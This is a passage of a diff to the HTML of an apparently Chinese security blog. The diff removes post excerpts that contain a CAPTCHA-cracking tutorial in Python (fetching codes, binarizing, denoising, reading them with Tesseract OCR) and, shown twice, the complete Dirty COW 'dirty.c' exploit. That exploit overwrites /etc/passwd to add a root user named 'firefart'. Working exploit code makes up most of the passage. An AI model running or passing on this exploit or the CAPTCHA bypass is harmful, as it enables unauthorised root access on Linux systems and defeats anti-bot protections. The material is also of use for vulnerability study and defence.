-         if pixdata[x-1, y] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x+1, y] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x-1, y-1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x-1, y+1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x+1, y-1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x+1, y+1] &gt; 245:
-            count &#x3D; count + 1
-         if count &gt; 4:
-            pixdata[x, y] &#x3D; 255
-   return img
-
-path &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;
-pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)
-images &#x3D; os.listdir(path)
-for image in images:
-   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:
-      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)
-      b_img &#x3D; binarizing(img, 230)
-      v &#x3D; depoint(b_img)
-      vcode &#x3D; pytesseract.image_to_string(v)
-      matches &#x3D; re.findall(pattern, vcode)
-      filename &#x3D; &#39;&#39;.join(map(str, matches))
-      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p><a target="_blank" rel="noopener" href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
-	
-
-	</div>
-  <a type="button" href="/2017/09/26/VerifyCode.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>先灰度处理</p>
-<pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # 打开图片
-img &#x3D; img.convert(&#39;L&#39;) # 转换成灰度图片
-img.save(&#39;1317-L.png&#39;) # 保存图片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>然后是二值化, 二值化处理之后，投影</p>
-<p>以预发布为例子，获取验证的url: <a target="_blank" rel="noopener" href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>得到的验证码是base64编码，使用python解码之后保存即可:</p>
-<pre class="line-numbers language-none"><code class="language-none">import requests
-url &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;
-
-for i in range(20):
-	imgfile &#x3D; str(i) + &#39;.jpg&#39;
-	req &#x3D; requests.get(url)
-	image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]
-	fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)
-	fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面的代码可以获取20个验证码，<br>然后处理验证码：</p>
-<p>先灰度处理–&gt; 二值化 –&gt; 投影或者使用8邻域算法</p>
-<p>我们这里使用8邻域算法。</p>
-<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
-from PIL import Image
-import os
-import re
-import pytesseract
-
-def binarizing(img, threshold):
-   img &#x3D; img.convert(&quot;L&quot;)
-   pixdata &#x3D; img.load()
-   w, h &#x3D; img.size
-   for y in range(h):
-      for x in range(w):
-         if pixdata[x, y] &lt; threshold:
-            pixdata[x, y] &#x3D; 0
-         else:
-            pixdata[x, y] &#x3D; 255
-   return img
-   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)
-
-
-def depoint(img):
-   pixdata &#x3D; img.load()
-   w,h &#x3D; img.size
-   for y in range(1,h-1):
-      for x in range(1, w-1):
-         count &#x3D; 0
-         if pixdata[x, y-1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x, y+1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x-1, y] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x+1, y] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x-1, y-1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x-1, y+1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x+1, y-1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x+1, y+1] &gt; 245:
-            count &#x3D; count + 1
-         if count &gt; 4:
-            pixdata[x, y] &#x3D; 255
-   return img
-
-path &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;
-pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)
-images &#x3D; os.listdir(path)
-for image in images:
-   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:
-      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)
-      b_img &#x3D; binarizing(img, 230)
-      v &#x3D; depoint(b_img)
-      vcode &#x3D; pytesseract.image_to_string(v)
-      matches &#x3D; re.findall(pattern, vcode)
-      filename &#x3D; &#39;&#39;.join(map(str, matches))
-      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p><a target="_blank" rel="noopener" href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
-	
-	</div>
-  <a type="button" href="/2017/09/26/VerifyCode.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/09/12/c0w.html" >C0w</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-09-12  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
-<pre class="line-numbers language-none"><code class="language-none">Compile with:
-&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
-&#x2F;&#x2F;
-&#x2F;&#x2F; Then run the newly create binary by either doing:
-&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
-&#x2F;&#x2F;
-&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
-&#x2F;&#x2F;
-&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
-&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
-&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
-&#x2F;&#x2F; as a base and automatically generates a new passwd line.
-&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
-&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
-&#x2F;&#x2F; and overwrites the root account with the generated line.
-&#x2F;&#x2F; After running the exploit you should be able to login with the newly
-&#x2F;&#x2F; created user.
-&#x2F;&#x2F;
-&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
-&#x2F;&#x2F;   The default is &quot;firefart&quot;.
-&#x2F;&#x2F;
-&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
-&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
-&#x2F;&#x2F;
-&#x2F;&#x2F; Compile with:
-&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
-&#x2F;&#x2F;
-&#x2F;&#x2F; Then run the newly create binary by either doing:
-&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
-&#x2F;&#x2F;
-&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
-&#x2F;&#x2F;
-&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
-&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
-&#x2F;&#x2F;
-&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
-&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
-&#x2F;&#x2F;
-
-#include &lt;fcntl.h&gt;
-#include &lt;pthread.h&gt;
-#include &lt;string.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdint.h&gt;
-#include &lt;sys&#x2F;mman.h&gt;
-#include &lt;sys&#x2F;types.h&gt;
-#include &lt;sys&#x2F;stat.h&gt;
-#include &lt;sys&#x2F;wait.h&gt;
-#include &lt;sys&#x2F;ptrace.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;crypt.h&gt;
-
-const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
-const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
-const char *salt &#x3D; &quot;firefart&quot;;
-
-int f;
-void *map;
-pid_t pid;
-pthread_t pth;
-struct stat st;
-
-struct Userinfo &#123;
-   char *username;
-   char *hash;
-   int user_id;
-   int group_id;
-   char *info;
-   char *home_dir;
-   char *shell;
-&#125;;
-
-char *generate_password_hash(char *plaintext_pw) &#123;
-  return crypt(plaintext_pw, salt);
-&#125;
-
-char *generate_passwd_line(struct Userinfo u) &#123;
-  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
-  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
-    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
-  char *ret &#x3D; malloc(size + 1);
-  sprintf(ret, format, u.username, u.hash, u.user_id,
-    u.group_id, u.info, u.home_dir, u.shell);
-  return ret;
-&#125;
-
-void *madviseThread(void *arg) &#123;
-  int i, c &#x3D; 0;
-  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
-    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
-  &#125;
-  printf(&quot;madvise %d\n\n&quot;, c);
-&#125;
-
-int copy_file(const char *from, const char *to) &#123;
-  &#x2F;&#x2F; check if target file already exists
-  if(access(to, F_OK) !&#x3D; -1) &#123;
-    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
-      to);
-    return -1;
-  &#125;
-
-  char ch;
-  FILE *source, *target;
-
-  source &#x3D; fopen(from, &quot;r&quot;);
-  if(source &#x3D;&#x3D; NULL) &#123;
-    return -1;
-  &#125;
-  target &#x3D; fopen(to, &quot;w&quot;);
-  if(target &#x3D;&#x3D; NULL) &#123;
-     fclose(source);
-     return -1;
-  &#125;
-
-  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
-     fputc(ch, target);
-   &#125;
-
-  printf(&quot;%s successfully backed up to %s\n&quot;,
-    from, to);
-
-  fclose(source);
-  fclose(target);
-
-  return 0;
-&#125;
-
-int main(int argc, char *argv[])
-&#123;
-  &#x2F;&#x2F; backup file
-  int ret &#x3D; copy_file(filename, backup_filename);
-  if (ret !&#x3D; 0) &#123;
-    exit(ret);
-  &#125;
-
-  struct Userinfo user;
-  &#x2F;&#x2F; set values, change as needed
-  user.username &#x3D; &quot;firefart&quot;;
-  user.user_id &#x3D; 0;
-  user.group_id &#x3D; 0;
-  user.info &#x3D; &quot;pwned&quot;;
-  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
-  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;
-
-  char *plaintext_pw;
-
-  if (argc &gt;&#x3D; 2) &#123;
-    plaintext_pw &#x3D; argv[1];
-    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
-  &#125; else &#123;
-    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
-  &#125;
-
-  user.hash &#x3D; generate_password_hash(plaintext_pw);
-  char *complete_passwd_line &#x3D; generate_passwd_line(user);
-  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);
-
-  f &#x3D; open(filename, O_RDONLY);
-  fstat(f, &amp;st);
-  map &#x3D; mmap(NULL,
-             st.st_size + sizeof(long),
-             PROT_READ,
-             MAP_PRIVATE,
-             f,
-             0);
-  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
-  pid &#x3D; fork();
-  if(pid) &#123;
-    waitpid(pid, NULL, 0);
-    int u, i, o, c &#x3D; 0;
-    int l&#x3D;strlen(complete_passwd_line);
-    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
-      for(o &#x3D; 0; o &lt; l; o++) &#123;
-        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
-          c +&#x3D; ptrace(PTRACE_POKETEXT,
-                      pid,
-                      map + o,
-                      *((long*)(complete_passwd_line + o)));
-        &#125;
-      &#125;
-    &#125;
-    printf(&quot;ptrace %d\n&quot;,c);
-  &#125;
-  else &#123;
-    pthread_create(&amp;pth,
-                   NULL,
-                   madviseThread,
-                   NULL);
-    ptrace(PTRACE_TRACEME);
-    kill(getpid(), SIGSTOP);
-    pthread_join(pth,NULL);
-  &#125;
-
-  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
-  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
-    user.username, plaintext_pw);
-    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
-    backup_filename, filename);
-  return 0;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/09/12/c0w.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
-<pre class="line-numbers language-none"><code class="language-none">Compile with:
-&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
-&#x2F;&#x2F;
-&#x2F;&#x2F; Then run the newly create binary by either doing:
-&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
-&#x2F;&#x2F;
-&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
-&#x2F;&#x2F;
-&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
-&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
-&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
-&#x2F;&#x2F; as a base and automatically generates a new passwd line.
-&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
-&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
-&#x2F;&#x2F; and overwrites the root account with the generated line.
-&#x2F;&#x2F; After running the exploit you should be able to login with the newly
-&#x2F;&#x2F; created user.
-&#x2F;&#x2F;
-&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
-&#x2F;&#x2F;   The default is &quot;firefart&quot;.
-&#x2F;&#x2F;
-&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
-&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
-&#x2F;&#x2F;
-&#x2F;&#x2F; Compile with:
-&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
-&#x2F;&#x2F;
-&#x2F;&#x2F; Then run the newly create binary by either doing:
-&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
-&#x2F;&#x2F;
-&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
-&#x2F;&#x2F;
-&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
-&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
-&#x2F;&#x2F;
-&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
-&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
-&#x2F;&#x2F;
-
-#include &lt;fcntl.h&gt;
-#include &lt;pthread.h&gt;
-#include &lt;string.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdint.h&gt;
-#include &lt;sys&#x2F;mman.h&gt;
-#include &lt;sys&#x2F;types.h&gt;
-#include &lt;sys&#x2F;stat.h&gt;
-#include &lt;sys&#x2F;wait.h&gt;
-#include &lt;sys&#x2F;ptrace.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;crypt.h&gt;
-
-const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
-const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
-const char *salt &#x3D; &quot;firefart&quot;;
-
-int f;
-void *map;
-pid_t pid;
-pthread_t pth;
-struct stat st;
-
-struct Userinfo &#123;
-   char *username;
-   char *hash;
-   int user_id;
-   int group_id;
-   char *info;
-   char *home_dir;
-   char *shell;
-&#125;;
-
-char *generate_password_hash(char *plaintext_pw) &#123;
-  return crypt(plaintext_pw, salt);
-&#125;
-
-char *generate_passwd_line(struct Userinfo u) &#123;
-  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
-  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
-    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
-  char *ret &#x3D; malloc(size + 1);
-  sprintf(ret, format, u.username, u.hash, u.user_id,
-    u.group_id, u.info, u.home_dir, u.shell);
-  return ret;
-&#125;
-
-void *madviseThread(void *arg) &#123;
-  int i, c &#x3D; 0;
-  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
-    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
-  &#125;
-  printf(&quot;madvise %d\n\n&quot;, c);
-&#125;
-
-int copy_file(const char *from, const char *to) &#123;
-  &#x2F;&#x2F; check if target file already exists
-  if(access(to, F_OK) !&#x3D; -1) &#123;
-    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
-      to);
-    return -1;
-  &#125;
-
-  char ch;
-  FILE *source, *target;
-
-  source &#x3D; fopen(from, &quot;r&quot;);
-  if(source &#x3D;&#x3D; NULL) &#123;
-    return -1;
-  &#125;
-  target &#x3D; fopen(to, &quot;w&quot;);
-  if(target &#x3D;&#x3D; NULL) &#123;
-     fclose(source);
-     return -1;
-  &#125;
-
-  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
-     fputc(ch, target);
-   &#125;
-
-  printf(&quot;%s successfully backed up to %s\n&quot;,
-    from, to);
-
-  fclose(source);
-  fclose(target);
-
-  return 0;
-&#125;
-
-int main(int argc, char *argv[])
-&#123;
-  &#x2F;&#x2F; backup file
-  int ret &#x3D; copy_file(filename, backup_filename);
-  if (ret !&#x3D; 0) &#123;
-    exit(ret);
-  &#125;
-
-  struct Userinfo user;
-  &#x2F;&#x2F; set values, change as needed
-  user.username &#x3D; &quot;firefart&quot;;
-  user.user_id &#x3D; 0;
-  user.group_id &#x3D; 0;
-  user.info &#x3D; &quot;pwned&quot;;
-  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
-  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;
-
-  char *plaintext_pw;
-
-  if (argc &gt;&#x3D; 2) &#123;
-    plaintext_pw &#x3D; argv[1];
-    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
-  &#125; else &#123;
-    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
-  &#125;
-
-  user.hash &#x3D; generate_password_hash(plaintext_pw);
-  char *complete_passwd_line &#x3D; generate_passwd_line(user);
-  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);
-
-  f &#x3D; open(filename, O_RDONLY);
-  fstat(f, &amp;st);
-  map &#x3D; mmap(NULL,
-             st.st_size + sizeof(long),
-             PROT_READ,
-             MAP_PRIVATE,
-             f,
-             0);
-  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
-  pid &#x3D; fork();
-  if(pid) &#123;
-    waitpid(pid, NULL, 0);
-    int u, i, o, c &#x3D; 0;
-    int l&#x3D;strlen(complete_passwd_line);
-    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
-      for(o &#x3D; 0; o &lt; l; o++) &#123;
-        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
-          c +&#x3D; ptrace(PTRACE_POKETEXT,
-                      pid,
-                      map + o,
-                      *((long*)(complete_passwd_line + o)));
-        &#125;
-      &#125;
-    &#125;
-    printf(&quot;ptrace %d\n&quot;,c);
-  &#125;
-  else &#123;
-    pthread_create(&amp;pth,
-                   NULL,
-                   madviseThread,
-                   NULL);
-    ptrace(PTRACE_TRACEME);
-    kill(getpid(), SIGSTOP);
-    pthread_join(pth,NULL);
-  &#125;
-
-  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
-  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
-    user.username, plaintext_pw);
-    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
-    backup_filename, filename);
-  return 0;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/09/12/c0w.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1346,6 +974,8 @@ int main(int argc, char *argv[])
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
+			<li><a href="/categories/Java/">Java<span>3</span></a></li>
+		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
@@ -1371,23 +1001,23 @@ int main(int argc, char *argv[])
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
       </li>
     
       <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
-      </li>
-    
-      <li>
-        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
       </li>
     
   </ul>
